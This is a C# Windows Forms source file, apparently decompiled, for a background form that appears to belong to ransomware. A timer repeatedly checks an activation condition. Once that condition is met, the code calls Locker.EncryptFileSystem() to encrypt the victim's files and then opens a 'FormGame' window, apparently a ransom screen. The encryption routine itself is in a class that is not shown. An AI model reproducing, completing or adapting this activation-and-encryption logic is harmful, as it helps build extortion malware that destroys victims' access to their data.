using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Main.Tools;

namespace Main
{
	public class FormBackground : Form
	{
		private IContainer components;

		private Timer timerActivateChecker;

		public FormBackground()
		{
			InitializeComponent();
			timerActivateChecker.Interval = Config.TimerActivateCheckerInterval;
			timerActivateChecker.Enabled = true;
		}

		private void timerActivateChecker_Tick(object sender, EventArgs e)
		{
			if (!Config.Activated && Hacking.ShouldActivate())
			{
				Config.Activated = true;
				ImposeRestrictions();
				new FormGame().Show(this);
			}
		}

		private static void ImposeRestrictions()
		{
			Locker.EncryptFileSystem();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			timerActivateChecker = new System.Windows.Forms.Timer(components);
			SuspendLayout();
			timerActivateChecker.Enabled = true;
			timerActivateChecker.Tick += new System.EventHandler(timerActivateChecker_Tick);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(284, 262);
			base.Name = "FormBackground";
			Text = "Form1";
			ResumeLayout(false);
		}
	}
}
